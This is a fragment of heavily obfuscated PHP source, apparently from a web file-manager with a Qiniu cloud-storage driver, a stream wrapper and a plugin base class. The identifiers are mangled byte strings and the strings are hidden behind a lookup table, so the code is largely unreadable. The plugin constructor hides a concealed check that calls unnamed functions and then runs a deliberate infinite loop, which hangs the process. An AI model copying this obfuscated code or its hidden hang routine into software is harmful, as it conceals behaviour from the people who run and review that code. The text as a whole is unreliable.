$ˆãó¤Áœ = isset($Æ½ã”Í[$ø½ü¶‚¾[1533]]) ? $Æ½ã”Í[$ø½ü¶‚¾[1533]] : array(); foreach ($ˆß‚Äƒ¸ as $•úß£„¶) { if ($•úß£„¶[$ø½ü¶‚¾[97]] == $‚ï™ÕÇÎ) { continue; } $Ó­¸øòë = $•úß£„¶[$ø½ü¶‚¾[97]]; $úîÁ¼ƒ = $•úß£„¶[$ø½ü¶‚¾[1529]]; $•úß£„¶[$ø½ü¶‚¾[79]] = $úîÁ¼ƒ; $ü›éÕªØ = $úîÁ¼ƒ == 0 && substr($Ó­¸øòë, strlen($Ó­¸øòë) - 1, 1) == $ø½ü¶‚¾[8] ? !0 : !1; $this->cacheMethodInfoSet($Ó­¸øòë, $ü›éÕªØ, $•úß£„¶); if ($ü›éÕªØ) { $’©ÃœÁ¨[] = $Ó­¸øòë; continue; } $–ëçªš[] = $Û¾ÜÆĞ” ? $•úß£„¶ : $Ó­¸øòë; } foreach ($ˆãó¤Áœ as $Ó­¸øòë) { if ($Ó­¸øòë == $‚ï™ÕÇÎ) { continue; } $’©ÃœÁ¨[] = $Ó­¸øòë; $this->cacheMethodInfoSet($Ó­¸øòë, !0); } if ($Áğ­¨ÑÁ === $ø½ü¶‚¾[12]) { break; } } $this->cacheMethodInfoSet($ˆ˜†ô¯š, !0); return array($ø½ü¶‚¾[85] => $’©ÃœÁ¨, $ø½ü¶‚¾[86] => $–ëçªš); } public function canRead($€Å™áÆõ) { return $this->exist($€Å™áÆõ) ? !0 : !1; } public function canWrite($Îï±¶¡‰) { return $this->exist($Îï±¶¡‰) ? !0 : !1; } public function getContent($È«Ñ¾µş) { return $this->fileSubstr($È«Ñ¾µş, 0, -1); } public function setContent($‰á†¨­ö, $ˆİÃ¬ŒÂ = '') { $ÕÀğ¢È = $this->tempFile($this->pathThis($‰á†¨­ö)); file_put_contents($ÕÀğ¢È, $ˆİÃ¬ŒÂ); if ($this->upload($‰á†¨­ö, $ÕÀğ¢È)) { $this->tempFileRemve($ÕÀğ¢È); return !0; } return !1; } public function refreshUrls($à¿¢¶¢ß) { $¡„÷ÕÆÖ =& $_SERVER[Š—Â“œÔ]; $şÒ’­˜ô = array(); if (is_array($à¿¢¶¢ß)) { foreach ($à¿¢¶¢ß as $€Ê´ÛõŠ) { $şÒ’­˜ô[] = $this->link($€Ê´ÛõŠ); } } else { $şÒ’­˜ô[] = $this->link($à¿¢¶¢ß); } $üü¸Ìä¸ = new Qiniu\Cdn\CdnManager($this->auth); list($™àØÆØ², $´ºú«¬ò) = $üü¸Ìä¸->refreshUrls($şÒ’­˜ô); if ($´ºú«¬ò) { return !1; } return $™àØÆØ²[$¡„÷ÕÆÖ[1261]] == $¡„÷ÕÆÖ[826] ? !0 : !1; } public function fileSubstr($™Òë¡‰ø, $ş÷é†ú, $ºË·ç) { $•Æƒò =& $_SERVER[Š—Â“œÔ]; if (!($Ôˆú¬‘İ = $this->link($™Òë¡‰ø))) { return !1; } $ûõË¦‡ì = !1; if ($ºË·ç > 0) { $®‡£¦äç = $ş÷é†ú + $ºË·ç - 1; $ûõË¦‡ì = array($•Æƒò[1534] . $ş÷é†ú . $•Æƒò[464] . $®‡£¦äç); } $´Ìœ¿ = url_request($Ôˆú¬‘İ, $•Æƒò[1494], !1, $ûõË¦‡ì); return $´Ìœ¿[$•Æƒò[817]] ? $´Ìœ¿[$•Æƒò[1284]] : !1; } public function upload($ñòßşÈş, $ûñ“Ì’Å, $×Ç§ñöº = false, $¸„ò®º¥ = REPEAT_REPLACE) { $Ü»ö¥î¦ = new Qiniu\Storage\UploadManager(); $—î½š‘ = $this->auth->uploadToken($this->bucket, $ñòßşÈş); $±«İ‰è = get_file_mime(get_path_ext($ûñ“Ì’Å)); list($ÅÆÒˆ–Û, $Ëğ—õ¥Û) = $Ü»ö¥î¦->putFile($—î½š‘, $ñòßşÈş, $ûñ“Ì’Å, null, $±«İ‰è); return $Ëğ—õ¥Û ? !1 : $this->getPathOuter($ñòßşÈş); } public function uploadFormData($ñ¨œ‰—, $•”²ù‚¿ = 3600) { return $this->uploadToken($ñ¨œ‰—, $•”²ù‚¿); } public function uploadMultiData($ÜÎá»Û, $ûŞñåÛ¥ = 3600) { return $this->uploadToken($ÜÎá»Û, $ûŞñåÛ¥); } private function uploadToken($­È­Íğ, $ä±õ«äü = 3600) { $×åìœ˜ =& $_SERVER[Š—Â“œÔ]; $–¥ÅıæÊ = $ä±õ«äü; $¤ı¿ïí· = array($×åìœ˜[1535] => $×åìœ˜[1536]); $°ÚÉÃŒÍ = $­È­Íğ; $ö®¶ïöä = $this->auth->uploadToken($this->bucket, $°ÚÉÃŒÍ, $–¥ÅıæÊ, $¤ı¿ïí·, !0); $óµá×İ = empty($this->region) || $this->region == $×åìœ˜[1537] ? $×åìœ˜[12] : $×åìœ˜[464] . $this->region; $é±¹€»¨ = http_type() . "\72\57\x2f\x75\x70\154\x6f\141\x64{$óµá×İ}\56\161\x69\x6e\151\x75\x70\56\143\157\155\x2f"; return array($×åìœ˜[1538] => $ö®¶ïöä, $×åìœ˜[1539] => $é±¹€»¨); } public function download($³«¦ß‚–, $é´àáÜ¿) { $‘”È¼Ó» = IO::getPathInner(IO::mkfile($é´àáÜ¿)); if (!($âı²ğõ = $this->link($³«¦ß‚–))) { return !1; } $Å´Œİ¿ = 0; $–âØò•ˆ = 1024 * 200; $œÎ§»ú = fopen($‘”È¼Ó», $_SERVER[Š—Â“œÔ][1540]); while (!0) { $Î‘ÓöØ· = $this->fileSubstr($³«¦ß‚–, $Å´Œİ¿, $–âØò•ˆ); if ($Î‘ÓöØ· === !1) { return !1; } fwrite($œÎ§»ú, $Î‘ÓöØ·); $Å´Œİ¿ += $–âØò•ˆ; if (strlen($Î‘ÓöØ·) < $–âØò•ˆ) { break; } } fclose($œÎ§»ú); return $é´àáÜ¿; } public function link($«îêô²ß, $ëıÃñ¼‡ = '') { if (!$this->isFile($«îêô²ß)) { return !1; } $Êµ‡ƒ¸é = $this->getHost() . $_SERVER[Š—Â“œÔ][8] . $this->pathEncode($«îêô²ß) . $ëıÃñ¼‡; return $this->auth->privateDownloadUrl($Êµ‡ƒ¸é, 3600 * 12); } public function fileOut($äŠı²˜Ï, $à‘ö’Œ = false, $³â¨Õœ“ = false, $½Ñé÷Ï“ = '') { $Á§ÃŒÏÂ =& $_SERVER[Š—Â“œÔ]; if ($this->isFileOutServer()) { return $this->fileOutServer($äŠı²˜Ï, $à‘ö’Œ, $³â¨Õœ“, $½Ñé÷Ï“); } if (!$³â¨Õœ“) { $³â¨Õœ“ = $this->pathThis($äŠı²˜Ï); } $ş÷ÉÏ¬ù = $à‘ö’Œ ? $Á§ÃŒÏÂ[1541] . rawurlencode($³â¨Õœ“) : $Á§ÃŒÏÂ[12]; $¦ëˆè‡» = $this->link($äŠı²˜Ï, $ş÷ÉÏ¬ù); $this->fileOutLink($¦ëˆè‡»); } public function fileOutServer($ü¥†§õİ, $üŞè¹Üø = false, $ÏÂÃó÷ = false, $•¥ÆŒ§Ì = '') { parent::fileOut($ü¥†§õİ, $üŞè¹Üø, $ÏÂÃó÷, $•¥ÆŒ§Ì); } public function fileOutImage($µ¸­úÍŸ, $×­¡î©¶ = 250) { if ($this->size($µ¸­úÍŸ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($µ¸­úÍŸ, $×­¡î©¶); } $Ÿ×ÅÁ“† = $this->link($µ¸­úÍŸ, $_SERVER[Š—Â“œÔ][1542] . $×­¡î©¶); $this->fileOutLink($Ÿ×ÅÁ“†); } public function fileOutImageServer($êğª‰Ù¡, $•¨€öÄÃ = 250) { parent::fileOutImage($êğª‰Ù¡, $•¨€öÄÃ); } public function hashMd5($»ª‹ü­) { $ÙœûóïÆ =& $_SERVER[Š—Â“œÔ]; $­ÖôšŒ« = $this->objectMeta($»ª‹ü­); return isset($­ÖôšŒ«[$ÙœûóïÆ[247]]) ? $­ÖôšŒ«[$ÙœûóïÆ[247]] : !1; $”ù×°­Ì = $this->link($»ª‹ü­, $ÙœûóïÆ[1543]); } public function size($Õ•£€½¨) { $Ìóœ±—ˆ = $this->objectMeta($Õ•£€½¨); return $Ìóœ±—ˆ ? $Ìóœ±—ˆ[$_SERVER[Š—Â“œÔ][79]] : 0; } public function info($­èµ¿…) { if ($this->isFolder($­èµ¿…)) { return $this->folderInfo($­èµ¿…); } else { if ($this->isFile($­èµ¿…)) { return $this->fileInfo($­èµ¿…); } } return !1; } public function exist($ïá«Ì÷ˆ) { return $this->isFile($ïá«Ì÷ˆ) || $this->isFolder($ïá«Ì÷ˆ); } public function isFile($Ğ°ŞÛ¤) { return !$this->isFolder($Ğ°ŞÛ¤) && $this->objectMeta($Ğ°ŞÛ¤); } public function isFolder($ß™Å‰Ä) { return $this->cacheMethod($_SERVER[Š—Â“œÔ][179], $ß™Å‰Ä); } protected function objectMeta($¨‚ÊèÄ) { return $this->cacheMethod($_SERVER[Š—Â“œÔ][181], $¨‚ÊèÄ); } protected function _objectMeta($‚µ·®£å) { $÷’‘£« =& $_SERVER[Š—Â“œÔ]; list($Æ®¶’ô³, $ËñŠ¼) = $this->bucketManager->stat($this->bucket, $‚µ·®£å); if ($Æ®¶’ô³) { $Æ®¶’ô³[$÷’‘£«[79]] = intval($Æ®¶’ô³[$÷’‘£«[1529]]); } return $Æ®¶’ô³; } protected function _isFolder($ùôİÓï) { $¢¶ÇÎÜ =& $_SERVER[Š—Â“œÔ]; if ($ùôİÓï == $¢¶ÇÎÜ[12] || $ùôİÓï == $¢¶ÇÎÜ[8]) { return !0; } list($¶øîˆ†, $„µŠ£) = $this->bucketManager->listFiles($this->bucket, trim($ùôİÓï, $¢¶ÇÎÜ[8]) . $¢¶ÇÎÜ[8], $¢¶ÇÎÜ[12], 1, $¢¶ÇÎÜ[8]); return !empty($¶øîˆ†[$¢¶ÇÎÜ[1532]]) || !empty($¶øîˆ†[$¢¶ÇÎÜ[1533]]) ? !0 : !1; } } goto fˆ¹‘å¸ç‚; BÓÚë£áôç: define($_SERVER[Š—Â“œÔ][319], 3); define($_SERVER[Š—Â“œÔ][320], 1); define($_SERVER[Š—Â“œÔ][321], 0); goto cèéŞğË‘„; CòÉ¶ê±ìµ: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($îìÍ„Ã†, $¾Ûæ—’« = '') { $this->info = $this->info($îìÍ„Ã†); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Š—Â“œÔ][87]]; $this->pathOpen = $îìÍ„Ã†; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$îìÍ„Ã†])) { self::$_chunkBuffer[$îìÍ„Ã†] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($öşš†Ø) { $úş¤›ê = $this->fileSubstr($this->pose, $öşš†Ø); $this->pose += strlen($úş¤›ê); return $úş¤›ê; } public function stream_tell() { return $this->pose; } public function stream_seek($‰„ôü‹”, $âê¼›ØŠ) { $Í»¾¤§Ğ =& $_SERVER[Š—Â“œÔ]; if ($âê¼›ØŠ == SEEK_SET) { $this->pose = $‰„ôü‹”; } else { if ($âê¼›ØŠ == SEEK_CUR) { $this->pose += $‰„ôü‹”; } else { if ($âê¼›ØŠ == SEEK_END) { $this->pose = $this->info[$Í»¾¤§Ğ[79]] + intval($‰„ôü‹”); } } } if ($‰„ôü‹” < 0) { $this->pose = $this->info[$Í»¾¤§Ğ[79]] + $‰„ôü‹”; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Š—Â“œÔ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($šñ“á„ã, $·°Éù—) { $íÍàøèƒ =& $_SERVER[Š—Â“œÔ]; $îŞ²ì = $this->info($šñ“á„ã); return array($íÍàøèƒ[1398] => 0, $íÍàøèƒ[1607] => 0, $íÍàøèƒ[16] => 32768 + 511, $íÍàøèƒ[1608] => 0, $íÍàøèƒ[1609] => 0, $íÍàøèƒ[1610] => 0, $íÍàøèƒ[1611] => 0, $íÍàøèƒ[79] => $îŞ²ì[$íÍàøèƒ[79]], $íÍàøèƒ[1612] => $îŞ²ì[$íÍàøèƒ[1453]], $íÍàøèƒ[1569] => $îŞ²ì[$íÍàøèƒ[88]], $íÍàøèƒ[1568] => $îŞ²ì[$íÍàøèƒ[233]], $íÍàøèƒ[1613] => 0, $íÍàøèƒ[1614] => 0); } static $fileInfo = array(); public function info($Â³Ğõ¦) { $òíÄ÷·± = $_SERVER[Š—Â“œÔ][1615]; if (isset(self::$fileInfo[$Â³Ğõ¦])) { return self::$fileInfo[$Â³Ğõ¦]; } if (substr($Â³Ğõ¦, 0, strlen($òíÄ÷·±)) != $òíÄ÷·±) { return !1; } self::$fileInfo[$Â³Ğõ¦] = IO::info(substr($Â³Ğõ¦, strlen($òíÄ÷·±))); return self::$fileInfo[$Â³Ğõ¦]; } public static function read($àôÌòº, $£Â½Ñæ½, $óñ€‚) { if (!isset(self::$_fopenCache[$àôÌòº])) { $İ­•İ‚µ = new StreamWrapperIO(); $İ­•İ‚µ->stream_open($àôÌòº); self::$_fopenCache[$àôÌòº] = $İ­•İ‚µ; } $İ­•İ‚µ = self::$_fopenCache[$àôÌòº]; return $İ­•İ‚µ->fileSubstr($£Â½Ñæ½, $óñ€‚); } public static function _read($ú¸“ùÍ´, $°¬ƒ°‘İ, $“íò¹°¦) { $°­àñÉ€ =& $_SERVER[Š—Â“œÔ]; $¡¹³µ”¯ = fopen($ú¸“ùÍ´, $°­àñÉ€[1457]); if (!$¡¹³µ”¯) { return $°­àñÉ€[12]; } $§¨˜­¥ = 8192; fseek($¡¹³µ”¯, $°¬ƒ°‘İ, SEEK_SET); $ÕØŒô = $°­àñÉ€[12]; $ºéŠ…Šğ = 0; while ($ºéŠ…Šğ < $“íò¹°¦) { $«ÒİóŠ = min($§¨˜­¥, $“íò¹°¦ - $ºéŠ…Šğ); $ÕØŒô .= fread($¡¹³µ”¯, $«ÒİóŠ); $ºéŠ…Šğ += $«ÒİóŠ; } fclose($¡¹³µ”¯); return $ÕØŒô; } public function fileSubstr($ÛøÓç€Ó, $âä°) { $íÖÚ‚Ô =& $_SERVER[Š—Â“œÔ]; $şŸõÚ× = $this->info[$íÖÚ‚Ô[79]]; $øµ‚Øë = $ÛøÓç€Ó; $Œüƒ«ÇĞ = $âä°; if ($ÛøÓç€Ó < 0) { $ÛøÓç€Ó = $şŸõÚ× + $ÛøÓç€Ó; } if ($âä° === !1) { $âä° = $şŸõÚ× - $ÛøÓç€Ó; } if ($ÛøÓç€Ó + $âä° > $şŸõÚ×) { $âä° = $şŸõÚ× - $ÛøÓç€Ó; } if ($âä° <= 0) { return $íÖÚ‚Ô[12]; } if ($ÛøÓç€Ó < 0 || $ÛøÓç€Ó >= $şŸõÚ× || $âä° <= 0 || $âä° > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\x69\154\145\122\145\141\x64\40\x65\162\162\x6f\x72\x21\x20\x73\x74\x61\x72\164\x3d{$ÛøÓç€Ó}\x3b\154\x65\x6e\147\x74\150\x3d{$âä°}\x3b\x20\163\x69\172\145\75{$şŸõÚ×}\x3b"); } $Õ¹ÉÅµ = 64 * 1024; $ÅÒæš‘ =& self::$_chunkBuffer[$this->path]; if (!$ÅÒæš‘) { $ÅÒæš‘ = array(); } $«ì£¤é± = 0; $êé·÷¸» = 0; $Ÿ†—ıÕ = $íÖÚ‚Ô[12]; foreach ($ÅÒæš‘ as $«ì£¤é± => $Ÿ†—ıÕ) { $«ì£¤é± = intval($«ì£¤é±); $êé·÷¸» = $«ì£¤é± + strlen($Ÿ†—ıÕ); if ($ÛøÓç€Ó >= $êé·÷¸») { continue; } if ($ÛøÓç€Ó >= $«ì£¤é± && $ÛøÓç€Ó + $âä° <= $êé·÷¸») { return substr($Ÿ†—ıÕ, $ÛøÓç€Ó - $«ì£¤é±, $âä°); } break; } if (count($ÅÒæš‘) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($íÖÚ‚Ô[1616], $íÖÚ‚Ô[1617] . count($ÅÒæš‘) . "\73\x73\164\x61\162\x74\x3d{$ÛøÓç€Ó}\54\154\145\x6e\147\x74\150\x3d{$âä°}\73\x70\x6f\x73\145\72{$«ì£¤é±}\176{$êé·÷¸»}"); throw new Exception($íÖÚ‚Ô[1618]); } $â—Œ¢Ò® = intval($ÛøÓç€Ó / $Õ¹ÉÅµ) * $Õ¹ÉÅµ; $Ó´ÜòÕˆ = ceil(($ÛøÓç€Ó + $âä°) / $Õ¹ÉÅµ) * $Õ¹ÉÅµ - $â—Œ¢Ò®; $…Ë«ö¡ = IO::fileSubstr($this->path, $â—Œ¢Ò®, $Ó´ÜòÕˆ); $ÅÒæš‘[$â—Œ¢Ò® . $íÖÚ‚Ô[12]] = $…Ë«ö¡; ksort($ÅÒæš‘); $´¬ğöÊÃ = substr($…Ë«ö¡, $ÛøÓç€Ó - $â—Œ¢Ò®, $âä°); return $´¬ğöÊÃ; } private function log($óòÄ¹˜†, $ÙÏ•±½) { $‚Èú×ƒÂ =& $_SERVER[Š—Â“œÔ]; $½ÄÎíí = timeFloat() - $this->timeStart; write_log(sprintf($‚Èú×ƒÂ[1619], $óòÄ¹˜†, $this->info[$‚Èú×ƒÂ[32]], $½ÄÎíí, $ÙÏ•±½), $‚Èú×ƒÂ[1261]); } } class Message { function __construct() { } public function send($ãˆµş¢¡ = '', $ÜË¾à©ó = array(), $‹¶÷‡¯É = "\164\x65\170\164") { $¶°ñßªÕ =& $_SERVER[Š—Â“œÔ]; $Î’öõé = array($¶°ñßªÕ[33] => $¶°ñßªÕ[1210], $¶°ñßªÕ[171] => $ãˆµş¢¡); if (in_array($‹¶÷‡¯É, array($¶°ñßªÕ[1210], $¶°ñßªÕ[1620]))) { $Î’öõé[$¶°ñßªÕ[33]] = $‹¶÷‡¯É; } $ÜË¾à©ó = array($¶°ñßªÕ[580] => isset($ÜË¾à©ó[$¶°ñßªÕ[580]]) ? $ÜË¾à©ó[$¶°ñßªÕ[580]] : $¶°ñßªÕ[12], $¶°ñßªÕ[667] => isset($ÜË¾à©ó[$¶°ñßªÕ[667]]) ? $ÜË¾à©ó[$¶°ñßªÕ[667]] : $¶°ñßªÕ[12]); if (empty($ãˆµş¢¡) || empty($ÜË¾à©ó[$¶°ñßªÕ[580]]) && empty($ÜË¾à©ó[$¶°ñßªÕ[667]])) { return !1; } $¥Ğ­Šı´ = array($¶°ñßªÕ[1549] => $Î’öõé, $¶°ñßªÕ[1621] => $ÜË¾à©ó); Hook::trigger($¶°ñßªÕ[1622], $¥Ğ­Šı´); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $õó±”¸ =& $_SERVER[Š—Â“œÔ]; if (!isset($_SERVER[$õó±”¸[947]]) || !isset($_SERVER[$õó±”¸[945]])) { $­ÃµëéŠ = $õó±”¸[948]; $¿Ğğšâì = $õó±”¸[949]; $™’çó£ = $_SERVER[$õó±”¸[950]] . $õó±”¸[951]; $£”ß©Ë´ = $¿Ğğšâì($™’çó£); $¡ÀóÒ×¡ = explode($õó±”¸[287], $£”ß©Ë´); if (count($¡ÀóÒ×¡) < $õó±”¸[694]) { $Ş½õùˆã = $õó±”¸[952]; $Ş½õùˆã(); } $ Âß„ß = $õó±”¸[953]; $ Âß„ß($_SERVER[$õó±”¸[954]]); $î¨¾ØŸÃ = 1; for ($ÌŸÃüÉ = $î¨¾ØŸÃ; $ÌŸÃüÉ > 0; $ÌŸÃüÉ++) { $ Âß„ß = json_encode($GLOBALS[$õó±”¸[494]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($õó±”¸[1623]); $this->pluginName = str_replace($õó±”¸[1623], $õó±”¸[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $õó±”¸[8]; $this->pluginApi = appHostGet() . $õó±”¸[1624] . $this->pluginName . $õó±”¸[8]; $this->pluginHost = $config[$õó±”¸[1625]] . $this->pluginName . $õó±”¸[8]; $this->pluginHostDefault = $config[$õó±”¸[1625]] . $this->pluginName . $õó±”¸[8]; $°æ È¸ñ = $config[$õó±”¸[1626]]; if ($°æ È¸ñ && strpos($õó±”¸[50] . $°æ È¸ñ . $õó±”¸[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$õó±”¸[1627]] . $this->pluginName . $õó±”¸[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Š—Â“œÔ][1628]); } protected function assign($Çà³æÂ, $ûÁ¿ˆ³’ = false) { if (is_array($Çà³æÂ)) { $this->values = array_merge($this->values, $Çà³æÂ); } else { $this->values[$Çà³æÂ] = $ûÁ¿ˆ³’; } } protected function display($¨…î˜·Ş) { extract($this->values); require $¨…î˜·Ş; } final function hookRegist($‚Ö’‡¼ì) { $this->modelPlugin->appRegist($this->pluginName, $‚Ö’‡¼ì); } final function appIcon() { $ô©‰á÷ë =& $_SERVER[Š—Â“œÔ]; $ââçµ‰ø = $this->appPackage(); $¿¡şÚÄ¼ = $ô©‰á÷ë[12]; if (isset($ââçµ‰ø[$ô©‰á÷ë[492]])) { if (isset($ââçµ‰ø[$ô©‰á÷ë[492]][$ô©‰á÷ë[1629]])) { $¿¡şÚÄ¼ = $ô©‰á÷ë[1630] . $ââçµ‰ø[$ô©‰á÷ë[492]][$ô©‰á÷ë[1629]] . $ô©‰á÷ë[1631]; } else { if ($ââçµ‰ø[$ô©‰á÷ë[492]][$ô©‰á÷ë[1632]]) { $¿¡şÚÄ¼ = $ô©‰á÷ë[1633] . $ââçµ‰ø[$ô©‰á÷ë[492]][$ô©‰á÷ë[1632]] . $ô©‰á÷ë[1634]; } } } return $¿¡şÚÄ¼; } final function fileCanView($¬Íè•á) { $¯£ËĞ‚ò =& $_SERVER[Š—Â“œÔ]; if (request_url_safe($¬Íè•á)) { return !0; } if ($this->isShare($¬Íè•á)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ß ù¸¹ = $¯£ËĞ‚ò[1635] . rawurlencode(this_url()); show_tips(LNG($¯£ËĞ‚ò[1636]) . $¯£ËĞ‚ò[1637] . $ß ù¸¹ . $¯£ËĞ‚ò[1638] . LNG($¯£ËĞ‚ò[1639]) . $¯£ËĞ‚ò[1640], !1); } if (!Action($¯£ËĞ‚ò[1641])->authCan($¯£ËĞ‚ò[1642])) { show_tips(LNG($¯£ËĞ‚ò[1643]) . $¯£ËĞ‚ò[1644], !1); } ActionCall($¯£ËĞ‚ò[1645], $¬Íè•á); } final function isShare($¥Ÿ…‘¦) { $…ô¡½§à = KodIO::parse($¥Ÿ…‘¦); return $…ô¡½§à[$_SERVER[Š—Â“œÔ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($¸è«üû) { if (request_url_safe($¸è«üû)) { return $¸è«üû; } if (!$this->isShare($¸è«üû)) { $¸è«üû = $this->filePath($¸è«üû, !1); } return Action($_SERVER[Š—Â“œÔ][1253])->linkOut($¸è«üû); } public function filePathLinkOut($ˆí˜Á»¬) { if (request_url_safe($ˆí˜Á»¬)) { return $ˆí˜Á»¬; } $this->fileCanView($ˆí˜Á»¬); return Action($_SERVER[Š—Â“œÔ][1253])->link($ˆí˜Á»¬); } final function filePath($ğÊÙÔ”, $¿¶­ÔÑ‰ = true, $¢ˆö¯¢ = false) { $§…€Ú– =& $_SERVER[Š—Â“œÔ]; $ˆ»»¨Ä° = $this->filePathGet($ğÊÙÔ”, $¿¶­ÔÑ‰); if (!$this->fileInfo) { show_tips(LNG($§…€Ú–[108]), !1); } if ($¢ˆö¯¢ && isset($this->fileInfo[$§…€Ú–[543]]) && $this->fileInfo[$§…€Ú–[543]]) { $ÃäÁ„ø¶ = Model($§…€Ú–[546])->fileInfo($this->fileInfo[$§…€Ú–[543]]); if (!$ÃäÁ„ø¶ || !IO::exist($ÃäÁ„ø¶[$§…€Ú–[87]])) { $¦îÇ‹ôŠ = LNG($§…€Ú–[108]) . LNG($§…€Ú–[1646]); if (KodUser::isRoot() && isset($ÃäÁ„ø¶[$§…€Ú–[87]])) { $¦îÇ‹ôŠ .= $§…€Ú–[1647] . $ÃäÁ„ø¶[$§…€Ú–[87]] . $§…€Ú–[1648]; } show_tips($¦îÇ‹ôŠ); } } Hook::trigger($§…€Ú–[1649], $ˆ»»¨Ä°); return $ˆ»»¨Ä°; } final function filePathGet($’“Ñ±¨–, $ü‘™ˆµÃ = true) { $œ¨ª¢„ù =& $_SERVER[Š—Â“œÔ]; if ($ºÚ½¢†æ = $this->checkSharePath($’“Ñ±¨–, $ü‘™ˆµÃ)) { return $ºÚ½¢†æ; } $this->fileCanView($’“Ñ±¨–); if (request_url_safe($’“Ñ±¨–)) { $îş¸éàç = parse_url_query($’“Ñ±¨–); if (isset($îş¸éàç[$œ¨ª¢„ù[1650]]) && isset($îş¸éàç[$œ¨ª¢„ù[236]])) { $‡ ¶›¼¯ = Mcrypt::decode($îş¸éàç[$œ¨ª¢„ù[236]], Model($œ¨ª¢„ù[837])->get($œ¨ª¢„ù[838])); if ($‡ ¶›¼¯) { $this->fileInfo = IO::info($‡ ¶›¼¯); $this->fileInfo[$œ¨ª¢„ù[1651]] = $’“Ñ±¨–; $this->cachePath = $this->pluginCachePath($œ¨ª¢„ù[12], $ü‘™ˆµÃ); return $‡ ¶›¼¯; } } $’“Ñ±¨– = $this->_cacheHttpFile($’“Ñ±¨–, $ü‘™ˆµÃ); $this->fileInfo = IO::info($’“Ñ±¨–); } else { $this->fileInfo = IO::info($’“Ñ±¨–); $this->cachePath = $this->pluginCachePath($œ¨ª¢„ù[12], $ü‘™ˆµÃ); } return $’“Ñ±¨–; } final function _cacheHttpFile($Æ§¤–†Ö, $–¾¦Õ£Ü = true) { $†ÔÍÃ•Á =& $_SERVER[Š—Â“œÔ]; $¨ÓŞ”Üä = parse_url_query($Æ§¤–†Ö); $ĞÒ£¨˜Á = get_path_ext($Æ§¤–†Ö); if (isset($¨ÓŞ”Üä[$†ÔÍÃ•Á[32]]) && $¨ÓŞ”Üä[$†ÔÍÃ•Á[32]]) { $ĞÒ£¨˜Á = get_path_ext($¨ÓŞ”Üä[$†ÔÍÃ•Á[32]]); } $¸÷í” = hash_path($Æ§¤–†Ö) . $†ÔÍÃ•Á[10] . $ĞÒ£¨˜Á; $this->cachePath = $this->pluginCachePath($–¾¦Õ£Ü ? $¸÷í” : $†ÔÍÃ•Á[12]); $‰¾¥ á = IO::fileNameExist($this->cachePath, $¸÷í”); if ($‰¾¥ á) { return KodIO::make($‰¾¥ á); } $…Å°·Ä = rtrim($this->cachePath, $†ÔÍÃ•Á[8]) . $†ÔÍÃ•Á[8] . $¸÷í”; return $this->pluginCacheFileSet($…Å°·Ä, file_get_contents_nossl($Æ§¤–†Ö)); } final function checkSharePath($ä®ºˆ³î, $‚Æå‰‰² = true) { $±—²÷ =& $_SERVER[Š—Â“œÔ]; if (!$this->isShare($ä®ºˆ³î)) { return !1; } $ÃÛñæç¿ = Action($±—²÷[1253])->sharePathInfo($ä®ºˆ³î); if (!is_array($ÃÛñæç¿) || !isset($ÃÛñæç¿[$±—²÷[87]])) { show_json(LNG($±—²÷[1652]), !1); } $this->fileInfo = $ÃÛñæç¿; $this->cachePath = $this->pluginCachePath(!1, $‚Æå‰‰²); return $ÃÛñæç¿[$±—²÷[87]]; } final function pluginCachePath($òÅÎÎı¯ = '', $„ç×¥ğ„ = false) { $–òË¸ç‘ =& $_SERVER[Š—Â“œÔ]; if ($„ç×¥ğ„ && is_array($this->fileInfo)) { $òÅÎÎı¯ = kodIO::hashPath($this->fileInfo); } $ŞÃêÕİ˜ = rtrim(IO_PATH_SYSTEM_TEMP . $–òË¸ç‘[1653] . $this->pluginName . $–òË¸ç‘[8] . $òÅÎÎı¯, $–òË¸ç‘[8]); $§Ü¼µİ = IO::infoFullSimple($ŞÃêÕİ˜); $–ÎÎÍ = $§Ü¼µİ && is_array($§Ü¼µİ) ? $§Ü¼µİ[$–òË¸ç‘[87]] : $–òË¸ç‘[12]; if (!$–ÎÎÍ) { $–ÎÎÍ = IO::mkdir($ŞÃêÕİ˜); } return $–ÎÎÍ; } final function pluginCacheFileSet($£¢‰Ï¡Â, $Ü“âÛı§ = '') { $ä‡²‡¿ =& $_SERVER[Š—Â“œÔ]; $É‡€¦‚´ = IO::infoFullSimple($£¢‰Ï¡Â); if (!$É‡€¦‚´) { return IO::mkfile($£¢‰Ï¡Â, $Ü“âÛı§, REPEAT_REPLACE); } IO::setContent($É‡€¦‚´[$ä‡²‡¿[87]], $Ü“âÛı§); return $É‡€¦‚´[$ä‡²‡¿[87]]; } final function pluginLocalFile($ó¸ş¯« = '') { $ŞËè–Ì =& $_SERVER[Š—Â“œÔ]; $â÷ÕİŒ® = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($â÷ÕİŒ®)) { mk_dir($â÷ÕİŒ®); } if (!$ó¸ş¯«) { return $â÷ÕİŒ®; } $ó¬Ã‘Àş = IO::info($ó¸ş¯«); $·²›éÆ‚ = $ŞËè–Ì[1654] . KodIO::hashPath($ó¬Ã‘Àş) . $ŞËè–Ì[10] . $ó¬Ã‘Àş[$ŞËè–Ì[169]]; if 